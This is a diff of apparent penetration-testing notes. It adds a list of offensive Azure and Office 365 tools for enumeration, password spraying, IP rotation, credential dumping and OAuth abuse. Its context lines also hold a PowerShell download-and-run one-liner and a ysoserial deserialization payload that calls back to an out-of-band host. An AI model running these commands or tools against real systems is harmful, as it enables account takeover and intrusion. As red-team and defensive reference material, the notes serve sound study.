@@ -279,3 +279,27 @@ Then we can use IEX(IWR -UseBasicParsing -Uri https:///.ps1)
 
 ------------------------------------------------------------------------------------
 ./ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "nslookup yuwewp90p365hx64wh7rumz8kzqxem.burpcollaborator.net" -o base64 -t
+
+---------------------------------------------------------------------------------------
+Azure testing (https://www.youtube.com/watch?v=cq_QApk7WJk)
+
+A tool for parsing breached passwords: https://github.com/hmaverickadams/breach-parse
+
+o365spray ia a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365): https://github.com/0xZDH/o365spray
+
+Scrape employee names from search engine LinkedIn profiles: https://github.com/0xZDH/BridgeKeeper
+
+AADInternals is PowerShell module for administering Azure AD and Office 365: https://github.com/Gerenios/AADInternals
+
+TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts: https://github.com/Flangvik/TeamFiltration
+
+Omnispray aims to replace tools such as o365spray and provide a modular framework to expand enumeration and spraying beyond just a single target/application.: https://github.com/0xZDH/Omnispray
+
+A password spraying tool for Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled. https://github.com/dafthack/MSOLSpray
+
+Rotates IP address with every request: https://github.com/ustayready/fireprox
+
+MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping https://github.com/NetSPI/MicroBurst
+=> Microsoft Azure Storage Explorer to connect to storage blob
+
+A web application framework for launching and managing OAuth abuse campaigns. https://github.com/mandiant/PwnAuth
